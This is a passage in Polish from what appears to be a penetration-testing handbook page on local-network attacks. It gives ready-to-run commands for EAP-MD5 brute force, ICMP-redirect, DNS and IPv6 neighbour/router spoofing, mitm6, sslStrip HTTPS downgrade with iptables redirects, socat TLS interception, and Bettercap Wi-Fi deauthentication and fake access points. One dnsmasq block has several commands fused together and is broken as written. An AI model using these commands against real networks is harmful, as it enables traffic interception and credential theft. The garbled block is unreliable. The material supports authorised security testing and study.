Jeśli atakujący znajduje się pomiędzy ofiarą a serwerem uwierzytelniania, może spróbować (jeśli to konieczne) zdegradować protokół uwierzytelniania do EAP-MD5 i przechwycić próbę uwierzytelnienia. Następnie mógłby zastosować brute-force przy użyciu:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) to klasa protokołów sieciowych zaprojektowana, aby **utworzyć aktywny redundantny system routingu**. Dzięki FHRP fizyczne routery mogą być połączone w jedno logiczne urządzenie, co zwiększa odporność na awarie i pomaga rozłożyć obciążenie.

**Inżynierowie Cisco Systems opracowali dwa protokoły FHRP, GLBP i HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Istnieją trzy znane wersje Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. Datagramy są wysyłane do sąsiadów przez port 520 przy użyciu UDP przez RIP i RIPv2, natomiast w przypadku RIPng datagramy są rozgłaszane na UDP port 521 przez IPv6 multicast. RIPv2 wprowadził wsparcie dla uwierzytelniania MD5. Z kolei RIPng nie zawiera natywnego uwierzytelniania i polega na opcjonalnych nagłówkach IPsec AH i ESP w IPv6.

- **RIP i RIPv2:** Komunikacja odbywa się przez datagramy UDP na porcie 520.
- **RIPng:** Wykorzystuje UDP port 521 do rozsyłania datagramów przez IPv6 multicast.

Zauważ, że RIPv2 obsługuje uwierzytelnianie MD5, podczas gdy RIPng nie zawiera natywnego uwierzytelniania i polega na nagłówkach IPsec AH i ESP w IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** to dynamiczny protokół routingu. **Jest to protokół distance-vector.** Jeśli nie ma **uwierzytelniania** i skonfigurowanych interfejsów pasywnych, **intruz** może zakłócić routing EIGRP i spowodować **otrucie tablic routingu**. Co więcej, sieć EIGRP (czyli system autonomiczny) **jest płaska i nie ma segmentacji na strefy**. Jeśli **atakujący wstrzyknie trasę**, istnieje duże prawdopodobieństwo, że trasa ta **rozprzestrzeni się** po całym autonomicznym systemie EIGRP.

Aby zaatakować system EIGRP, trzeba **ustanowić sąsiedztwo z legalnym routerem EIGRP**, co otwiera wiele możliwości, od podstawowego rozpoznania po różne wstrzyknięcia.

[**FRRouting**](https://frrouting.org/) pozwala zaimplementować **wirtualny router obsługujący BGP, OSPF, EIGRP, RIP i inne protokoły.** Wystarczy wdrożyć go na systemie atakującego i można podszywać się pod legalny router w domenie routingu.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) ma możliwości przechwytywania broadcastów EIGRP (Enhanced Interior Gateway Routing Protocol). Pozwala też na wstrzykiwanie pakietów, które można wykorzystać do zmiany konfiguracji routingu.

### OSPF

W protokole Open Shortest Path First (OSPF) **uwierzytelnianie MD5 jest powszechnie stosowane, aby zapewnić bezpieczną komunikację między routerami**. Jednak ten mechanizm bezpieczeństwa można złamać za pomocą narzędzi takich jak Loki i John the Ripper. Narzędzia te potrafią przechwycić i złamać skróty MD5, ujawniając klucz uwierzytelniający. Po uzyskaniu tego klucza można użyć go do wprowadzenia nowych informacji routingu. Do skonfigurowania parametrów trasy i ustalenia skompromitowanego klucza służą odpowiednio zakładki _Injection_ i _Connection_.

- **Przechwytywanie i łamanie skrótów MD5:** Do tego celu używa się narzędzi takich jak Loki i John the Ripper.
- **Konfiguracja parametrów trasy:** Odbywa się przez zakładkę _Injection_.
- **Ustawienie skompromitowanego klucza:** Klucz konfiguruje się w zakładce _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Narzędzie do skanowania ruchu sieciowego i znajdowania luk
- Więcej informacji o **atakach sieciowych** można znaleźć [**tutaj**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Atakujący konfiguruje wszystkie parametry sieciowe (GW, IP, DNS) nowego członka sieci, wysyłając fałszywe odpowiedzi DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect polega na wysyłaniu ICMP packet typu 1 code 5, który informuje, że attacker jest najlepszą drogą dotarcia do IP. Następnie, gdy victim chce skontaktować się z IP, wyśle packet przez attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Atakujący rozwiąże niektóre (lub wszystkie) domeny, o które prosi ofiara.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Skonfiguruj własny DNS za pomocą dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalne bramy

Do systemów i sieci często prowadzi wiele tras. Po zbudowaniu listy adresów MAC w sieci lokalnej użyj _gateway-finder.py_, aby zidentyfikować hosty, które obsługują przekazywanie IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Dla rozwiązywania nazw hostów lokalnych, gdy zapytania DNS zawodzą, systemy Microsoft polegają na Link-Local Multicast Name Resolution (LLMNR) oraz NetBIOS Name Service (NBT-NS). Podobnie implementacje Apple Bonjour i Linux zero-configuration wykorzystują Multicast DNS (mDNS) do wykrywania systemów w sieci. Ponieważ te protokoły nie oferują uwierzytelnienia i działają przez UDP, wykorzystując transmisje multicast/broadcast, mogą być nadużyte przez atakujących w celu przekierowania użytkowników do złośliwych usług.

Możesz podszyć się pod usługi wyszukiwane przez hosty, używając Responder do wysyłania fałszywych odpowiedzi.\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Przeglądarki często korzystają z protokołu Web Proxy Auto-Discovery (WPAD), aby automatycznie pobierać ustawienia proxy. Obejmuje to pobieranie konfiguracji z serwera, na przykład z URL-a takiego jak "http://wpad.example.org/wpad.dat". Odkrycie tego serwera przez klienty może odbywać się różnymi mechanizmami:

- Przez DHCP, gdzie odkrycie ułatwia wpis o specjalnym kodzie 252.
- Przez DNS, polegające na wyszukiwaniu nazwy hosta oznaczonej jako _wpad_ w domenie lokalnej.
- Przez Microsoft LLMNR i NBT-NS, które są mechanizmami zapasowymi używanymi, gdy zapytania DNS nie powiodą się.

Narzędzie Responder wykorzystuje ten protokół, udając złośliwy serwer WPAD. Używa DHCP, DNS, LLMNR i NBT-NS, aby wprowadzić klientów w błąd i skłonić ich do połączenia. Aby dowiedzieć się więcej o tym, jak usługi mogą być podszywane przy użyciu Responder, [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Możesz zaoferować różne usługi w sieci, aby spróbować oszukać użytkownika i skłonić go do wpisania poświadczeń w postaci plain-text. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Ten atak jest bardzo podobny do ARP Spoofing, ale w świecie IPv6. Możesz sprawić, że ofiara uwierzy, iż adres IPv6 bramy (GW) odpowiada adresowi MAC atakującego.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Niektóre OS domyślnie ustawiają gateway na podstawie pakietów RA wysyłanych w sieci. Aby zadeklarować atakującego jako IPv6 router, możesz użyć:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Domyślnie niektóre OS próbują skonfigurować DNS, odczytując pakiet DHCPv6 w sieci. Wtedy atakujący może wysłać pakiet DHCPv6, aby ustawić się jako DNS. DHCP także przydziela ofierze adres IPv6.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fałszywa strona i wstrzyknięcie kodu JS)

## Ataki internetowe

### sslStrip

Zasadniczo atak polega na tym, że jeśli **user** próbuje **uzyskać dostęp** do strony **HTTP**, która **przekierowuje** na wersję **HTTPS**, to **sslStrip** utrzyma **połączenie HTTP z** **client i** **połączenie HTTPS z** **server**, dzięki czemu będzie w stanie **sniff** połączenie w **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy do omijania HSTS

Różnica między **sslStrip+ and dns2proxy** a **sslStrip** polega na tym, że przekierują na przykład _**www.facebook.com**_ **do** _**wwww.facebook.com**_ (zwróć uwagę na dodatkowe "**w**") i ustawią **adres tej domeny jako attacker IP**. W ten sposób **client** **połączy się** z _**wwww.facebook.com**_ **(attacker)**, ale za kulisami **sslstrip+** utrzyma **rzeczywiste połączenie** przez https z **www.facebook.com**.

Celem tej techniki jest **obejście HSTS**, ponieważ _**wwww**.facebook.com_ **nie zostanie** zapisany w **cache** przeglądarki, więc przeglądarka zostanie oszukana, aby wykonać **facebook authentication in HTTP**.\
Zwróć uwagę, że aby przeprowadzić ten atak, ofiara musi na początku próbować uzyskać dostęp do [http://www.faceook.com](http://www.faceook.com), a nie https. Można to osiągnąć, modyfikując linki na stronie serwowanej przez http.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ już nie działają. Wynika to z tego, że przeglądarki mają presaved HSTS rules, więc nawet jeśli użytkownik po raz pierwszy odwiedza „ważną” domenę, otworzy ją przez HTTPS. Zauważ także, że presaved rules i inne generowane reguły mogą używać flagi** [**`includeSubdomains`**](https://hstspreload.appspot.com) **więc podany wcześniej przykład z** _**wwww.facebook.com**_ **nie będzie już działać, ponieważ** _**facebook.com**_ **używa HSTS z `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Nasłuchiwanie TCP na porcie
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL nasłuch na porcie

#### Generowanie kluczy i samopodpisanego certyfikatu
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Nasłuch przy użyciu certyfikatu
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Nasłuchuj przy użyciu certyfikatu i przekieruj na hosty
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Czasami, jeśli klient sprawdza, czy CA jest prawidłowa, możesz **dostarczyć certyfikat dla innego hostname podpisany przez CA**.\
Inny ciekawy test to dostarczyć c**ertyfikat dla żądanego hostname ale self-signed**.

Inne rzeczy do przetestowania to próba podpisania certyfikatu przy użyciu ważnego certyfikatu, który nie jest prawidłowym CA. Albo użycie prawidłowego klucza publicznego i wymuszenie użycia algorytmu takiego jak diffie hellman (takiego, który nie wymaga odszyfrowywania niczego prawdziwym kluczem prywatnym), a gdy klient zażąda dowodu prawdziwego klucza prywatnego (np. hash), wysłać fałszywy dowód i oczekiwać, że klient tego nie sprawdzi.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Uwagi dotyczące aktywnego odkrywania

Weź pod uwagę, że gdy pakiet UDP jest wysyłany do urządzenia, które nie ma żądanego portu, wysyłany jest komunikat ICMP (Port Unreachable).

### **ARP discover**

Pakiety ARP są używane do odkrywania, które adresy IP są używane w sieci. Komputer musi wysłać żądanie dla każdego możliwego adresu IP i tylko te, które są w użyciu, odpowiedzą.

### **mDNS (multicast DNS)**

Bettercap wysyła żądanie MDNS (co X ms) pytające o **\_services\_.dns-sd.\_udp.local**; maszyna, która zobaczy ten pakiet, zwykle odpowie na to żądanie. Następnie szuka tylko maszyn odpowiadających na "services".

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap rozsyła pakiety broadcast na port 137/UDP pytając o nazwę "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap rozsyła pakiety SSDP wyszukując wszystkie rodzaje usług (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap rozsyła pakiety WSD wyszukując usługi (UDP Port 3702).


### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Referencje

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
